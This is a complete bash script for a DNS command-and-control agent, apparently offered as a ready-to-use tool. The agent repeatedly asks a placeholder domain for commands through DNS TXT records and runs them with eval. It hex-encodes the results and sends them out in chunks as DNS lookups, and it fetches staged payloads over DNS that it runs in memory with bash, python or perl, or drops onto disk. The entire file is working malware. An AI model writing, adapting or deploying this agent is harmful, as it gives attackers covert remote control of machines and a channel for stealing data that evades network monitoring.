#!/bin/bash

BASE_DOMAIN="domain.com"
COMMAND_SUBDOMAIN="cmd"
DATA_SUBDOMAIN="data"
DOWNLOAD_SUBDOMAIN="dl"
SLEEP_TIME_SECONDS=15
EXFIL_CHUNK_SIZE=50

AGENT_ID=$(hostname | tr '[:lower:]' '[:upper:]' | tr -cd 'A-Za-z0-9' | head -c 15)
LAST_COMMAND_ID=""

log_info() {
    echo -e "\033[0;32m[+]\033[0m $1"
}

log_warn() {
    echo -e "\033[0;33m[!]\033[0m $1"
}

log_error() {
    echo -e "\033[0;31m[-]\033[0m $1"
}

log_debug() {
    echo -e "\033[0;90m[.]\033[0m $1"
}

get_nonce() {
    head -c 4 /dev/urandom 2>/dev/null | od -An -tu4 | tr -d ' ' | head -c 6
}

hex_encode() {
    local text="$1"
    echo -n "$text" | xxd -p | tr -d '\n'
}

hex_decode() {
    local hex="$1"
    echo -n "$hex" | xxd -r -p
}

dns_txt_query() {
    local fqdn="$1"
    local result=""
    
    if command -v dig &>/dev/null; then
        result=$(dig +short +timeout=5 +tries=2 TXT "$fqdn" 2>/dev/null | tr -d '"' | tr -d '\n')
    elif command -v nslookup &>/dev/null; then
        result=$(nslookup -type=TXT "$fqdn" 2>/dev/null | grep -oP 'text = "\K[^"]+' | tr -d '\n')
    elif command -v host &>/dev/null; then
        result=$(host -t TXT "$fqdn" 2>/dev/null | grep -oP 'descriptive text "\K[^"]+' | tr -d '\n')
    else
        log_error "No DNS query tool available (dig, nslookup, or host)"
        return 1
    fi
    
    echo -n "$result"
}

dns_a_query() {
    local fqdn="$1"
    
    if command -v dig &>/dev/null; then
        dig +short +timeout=3 +tries=1 A "$fqdn" &>/dev/null
    elif command -v nslookup &>/dev/null; then
        nslookup "$fqdn" &>/dev/null
    elif command -v host &>/dev/null; then
        host -t A "$fqdn" &>/dev/null
    else
        exec 3<>/dev/udp/8.8.8.8/53 2>/dev/null && exec 3>&-
    fi
    
    return $?
}

decompress_gzip() {
    local input_file="$1"
    local output_file="$2"
    
    gzip -d -c "$input_file" > "$output_file" 2>/dev/null
    return $?
}

calc_checksum() {
    local file="$1"
    
    if command -v md5sum &>/dev/null; then
        md5sum "$file" 2>/dev/null | cut -c1-8
    elif command -v md5 &>/dev/null; then
        md5 -q "$file" 2>/dev/null | cut -c1-8
    else
        openssl md5 "$file" 2>/dev/null | awk '{print $2}' | cut -c1-8
    fi
}

do_checkin() {
    local nonce=$(get_nonce)
    local command_fqdn="${nonce}.${COMMAND_SUBDOMAIN}.${BASE_DOMAIN}"
    
    log_debug "Checking in with FQDN: $command_fqdn"
    
    local response=$(dns_txt_query "$command_fqdn")
    
    if [[ -z "$response" ]]; then
        return 1
    fi
    
    if [[ "$response" =~ ^CMD:([0-9]+):(.*)$ ]]; then
        CMD_ID="${BASH_REMATCH[1]}"
        CMD_COMMAND="${BASH_REMATCH[2]}"
        log_info "Received command ID: $CMD_ID, Command: $CMD_COMMAND"
        return 0
    fi
    
    return 1
}

do_exfiltrate() {
    local session_id="$1"
    local command_id="$2"
    local result="$3"
    
    log_warn "Starting exfiltration for Session ID: $session_id, Command ID: $command_id"
    
    local hex_result=$(hex_encode "$result")
    log_debug "Hex encoded length: ${#hex_result}"
    
    local total_length=${#hex_result}
    local chunks=()
    local i=0
    
    while [[ $i -lt $total_length ]]; do
        chunks+=("${hex_result:$i:$EXFIL_CHUNK_SIZE}")
        ((i += EXFIL_CHUNK_SIZE))
    done
    
    local total_fragments=${#chunks[@]}
    log_debug "Total fragments to send: $total_fragments"
    
    for ((i=0; i<${#chunks[@]}; i++)); do
        local chunk="${chunks[$i]}"
        local sequence_number=$((i + 1))
        local fqdn="${sequence_number}-${total_fragments}-${command_id}-${chunk}.${session_id}.${DATA_SUBDOMAIN}.${BASE_DOMAIN}"
        
        local max_retries=3
        local retry_count=0
        local success=false
        
        while [[ "$success" == "false" && $retry_count -lt $max_retries ]]; do
            ((retry_count++))
            log_debug "Sending fragment $sequence_number/$total_fragments (Attempt $retry_count/$max_retries, CmdID: $command_id)"
            
            if dns_a_query "$fqdn"; then
                success=true
                log_info "  -> Fragment $sequence_number sent successfully"
            else
                log_error "  -> Failed attempt $retry_count for fragment $sequence_number"
                if [[ $retry_count -lt $max_retries ]]; then
                    log_warn "  -> Retrying in 2 seconds..."
                    sleep 2
                fi
            fi
        done
        
        if [[ "$success" == "false" ]]; then
            log_error "  -> FAILED to send fragment $sequence_number after $max_retries attempts!"
        fi
        
        if [[ $i -lt $((${#chunks[@]} - 1)) ]]; then
            log_debug "  -> Waiting 3 seconds before next fragment..."
            sleep 3
        fi
    done
    
    log_info "Exfiltration complete."
}

get_staged_file() {
    local file_id="$1"
    
    log_warn "Downloading staged file: $file_id"
    
    local meta_fqdn="0.${file_id}.${DOWNLOAD_SUBDOMAIN}.${BASE_DOMAIN}"
    local metadata=$(dns_txt_query "$meta_fqdn")
    
    if [[ -z "$metadata" ]]; then
        log_error "Failed to fetch metadata for file: $file_id"
        return 1
    fi
    
    IFS='|' read -r action total_fragments checksum filename destination <<< "$metadata"
    
    if [[ -z "$action" || -z "$total_fragments" || -z "$checksum" || -z "$filename" ]]; then
        log_error "Invalid metadata format"
        return 1
    fi
    
    destination="${destination//\\\\/\\}"
    
    log_debug "  Action: $action, Fragments: $total_fragments, File: $filename"
    
    local encoded_data=""
    
    for ((i=1; i<=total_fragments; i++)); do
        local fragment_fqdn="${i}.${file_id}.${DOWNLOAD_SUBDOMAIN}.${BASE_DOMAIN}"
        
        local max_retries=3
        local retry_count=0
        local success=false
        local fragment_data=""
        
        while [[ "$success" == "false" && $retry_count -lt $max_retries ]]; do
            ((retry_count++))
            log_debug "  Fetching fragment $i/$total_fragments (Attempt $retry_count)"
            
            fragment_data=$(dns_txt_query "$fragment_fqdn")
            
            if [[ -n "$fragment_data" ]]; then
                success=true
            else
                log_error "    Failed attempt $retry_count"
                if [[ $retry_count -lt $max_retries ]]; then
                    sleep 0.5
                fi
            fi
        done
        
        if [[ "$success" == "false" ]]; then
            log_error "  FAILED to fetch fragment $i after $max_retries attempts"
            return 1
        fi
        
        encoded_data+="$fragment_data"
        sleep 0.1
    done
    
    log_debug "  All fragments received. Decompressing..."
    
    local temp_compressed=$(mktemp)
    local temp_decompressed=$(mktemp)
    
    echo -n "$encoded_data" | base64 -d > "$temp_compressed" 2>/dev/null
    
    if ! decompress_gzip "$temp_compressed" "$temp_decompressed"; then
        log_error "  Error decompressing data"
        rm -f "$temp_compressed" "$temp_decompressed"
        return 1
    fi
    
    local received_checksum=$(calc_checksum "$temp_decompressed")
    
    if [[ "$received_checksum" != "$checksum" ]]; then
        log_error "  Checksum mismatch! Expected: $checksum, Got: $received_checksum"
        rm -f "$temp_compressed" "$temp_decompressed"
        return 1
    fi
    
    log_info "  Checksum verified: $received_checksum"
    
    STAGED_ACTION="$action"
    STAGED_DATA_FILE="$temp_decompressed"
    STAGED_FILENAME="$filename"
    STAGED_DESTINATION="$destination"
    
    rm -f "$temp_compressed"
    return 0
}

execute_staged_file() {
    local action="$STAGED_ACTION"
    local data_file="$STAGED_DATA_FILE"
    local filename="$STAGED_FILENAME"
    local destination="$STAGED_DESTINATION"
    
    local result=""
    
    if [[ "$action" == "EXEC" ]]; then
        log_warn "Executing file in memory: $filename"
        
        local script_content=$(cat "$data_file")
        
        if [[ "$filename" == *.py ]]; then
            if command -v python3 &>/dev/null; then
                result=$(echo "$script_content" | python3 2>&1)
            elif command -v python &>/dev/null; then
                result=$(echo "$script_content" | python 2>&1)
            else
                result="[EXEC ERROR] Python not available"
            fi
        elif [[ "$filename" == *.pl ]]; then
            if command -v perl &>/dev/null; then
                result=$(echo "$script_content" | perl 2>&1)
            else
                result="[EXEC ERROR] Perl not available"
            fi
        else
            result=$(bash -c "$script_content" 2>&1)
        fi
        
        if [[ -z "$result" ]]; then
            result="[EXEC] Script '$filename' executed successfully (no output)"
        fi
        
    elif [[ "$action" == "PUSH" ]]; then
        local final_path="$destination"
        
        if [[ -d "$destination" ]]; then
            final_path="${destination%/}/$filename"
        elif [[ "$destination" == */ ]]; then
            final_path="${destination}${filename}"
        fi
        
        log_warn "Saving file to: $final_path"
        
        local parent_dir=$(dirname "$final_path")
        if [[ -n "$parent_dir" && ! -d "$parent_dir" ]]; then
            mkdir -p "$parent_dir" 2>/dev/null
        fi
        
        local file_size=$(stat -f%z "$data_file" 2>/dev/null || stat -c%s "$data_file" 2>/dev/null)
        
        if cp "$data_file" "$final_path" 2>/dev/null; then
            result="File saved successfully to: $final_path ($file_size bytes)"
        else
            result="Error saving file to: $final_path"
        fi
        
    else
        result="Unknown action: $action"
    fi
    
    rm -f "$data_file"
    
    echo "$result"
}

execute_command() {
    local command="$1"
    
    log_warn "Executing: $command"
    
    local result
    result=$(eval "$command" 2>&1)
    
    echo "$result"
}

process_command() {
    local command="$CMD_COMMAND"
    local result=""
    
    if [[ "$command" =~ ^EXEC:([a-f0-9]+)$ ]]; then
        local file_id="${BASH_REMATCH[1]}"
        log_debug "EXEC command detected. File ID: $file_id"
        
        if get_staged_file "$file_id"; then
            result=$(execute_staged_file)
        else
            result="Failed to download staged file: $file_id"
        fi
        
    elif [[ "$command" =~ ^PUSH:([a-f0-9]+)$ ]]; then
        local file_id="${BASH_REMATCH[1]}"
        log_debug "PUSH command detected. File ID: $file_id"
        
        if get_staged_file "$file_id"; then
            result=$(execute_staged_file)
        else
            result="Failed to download staged file: $file_id"
        fi
        
    else
        result=$(execute_command "$command")
    fi
    
    echo "$result"
}

main() {
    log_info "Starting Bash DNS C2 Agent..."
    log_info "Agent ID: $AGENT_ID"
    log_debug "Base Domain: $BASE_DOMAIN"
    log_debug "Sleep Interval: ${SLEEP_TIME_SECONDS}s"
    
    local missing_tools=()
    
    if ! command -v xxd &>/dev/null; then
        missing_tools+=("xxd")
    fi
    
    if ! command -v base64 &>/dev/null; then
        missing_tools+=("base64")
    fi
    
    if ! command -v gzip &>/dev/null; then
        missing_tools+=("gzip")
    fi
    
    if ! command -v dig &>/dev/null && ! command -v nslookup &>/dev/null && ! command -v host &>/dev/null; then
        missing_tools+=("dig/nslookup/host")
    fi
    
    if [[ ${#missing_tools[@]} -gt 0 ]]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        log_error "Please install the missing tools and try again."
        exit 1
    fi
    
    log_info "All required tools available. Starting main loop..."
    
    while true; do
        if do_checkin; then
            if [[ "$CMD_ID" != "$LAST_COMMAND_ID" ]]; then
                LAST_COMMAND_ID="$CMD_ID"
                log_debug "New command detected (ID: $LAST_COMMAND_ID)"
                
                local result=$(process_command)
                do_exfiltrate "$AGENT_ID" "$LAST_COMMAND_ID" "$result"
            else
                log_debug "Same command ID, skipping..."
            fi
        else
            log_debug "No new command. Agent alive."
        fi
        
        log_debug "Sleeping for $SLEEP_TIME_SECONDS seconds..."
        sleep "$SLEEP_TIME_SECONDS"
    done
}

trap 'log_warn "Agent terminated."; exit 0' SIGINT SIGTERM

main "$@"
